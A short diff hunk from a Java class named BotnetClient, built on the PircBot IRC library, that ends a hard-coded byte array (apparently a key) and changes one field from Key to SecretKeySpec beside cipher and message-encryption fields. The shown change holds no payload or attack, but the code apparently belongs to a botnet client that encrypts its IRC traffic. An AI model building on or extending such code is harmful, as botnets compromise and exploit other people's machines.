@@ -36,7 +36,7 @@ public class BotnetClient extends PircBot {
 	(byte)0xee, (byte)0x80, (byte)032, (byte)0x9d, (byte)0xb8, (byte)0xb1, (byte)0x47, 
 	(byte)0x65, (byte)0xa1, (byte)0xd0, (byte)0x01};
 
-	private Key startKey;
+	private SecretKeySpec startKey;
 	private Cipher startCipher;
 	private MsgEncrypt startMsgE;
 	
